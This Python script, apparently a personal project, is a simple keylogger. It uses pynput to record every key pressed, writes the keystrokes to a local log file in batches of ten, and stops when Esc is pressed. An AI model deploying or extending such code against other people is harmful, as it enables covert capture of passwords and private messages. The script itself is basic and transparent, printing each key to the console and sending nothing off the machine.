# -*- coding: utf-8 -*-
"""
Created on Tue Dec  3 00:25:22 2019

@author: Ehsan
"""

from pynput.keyboard import Key, Listener

import os.path

from datetime import datetime
#today = date.today()
now=datetime.now()

file_name = r'D:\projects\GITHUB\KeyLogger\KeyLogger\log.txt'

if os.path.isfile(file_name):
    print ("File exist")
    try:
        f = open(file_name,"w")
        f.write("Today "+ str(now) +" \n") 

    # Do something with the file
    except IOError:
        print("File not accessible")
    finally:
        f.close()
else:
    print ("File not exist")



count = 0
keys = []

#print ()


def on_press(key):
    global keys, count
    
    keys.append(key)
    count += 1
    
    print('{0} pressed'.format(
        key))
    print(count)
    
    if count >= 10:
        count = 0 
        write_file(keys)
        keys = []
        

def on_release(key):
    print('{0} release'.format(
        key))
    if key == Key.esc:
        # Stop listener
        return False
    
def write_file(keys):
    with open(file_name,"a") as f: #w if file does not exist, a if file exist
        for key in keys:
            k = str(key).replace("'","")
            if k.find("space")>0: 
                f.write("\n")
            elif k.find("Key") == -1:
                f.write(k)
            
            #print("writing key to file")
        
        
# Collect events until released
with Listener(
        on_press=on_press,
        on_release=on_release) as listener:
    listener.join()
    
    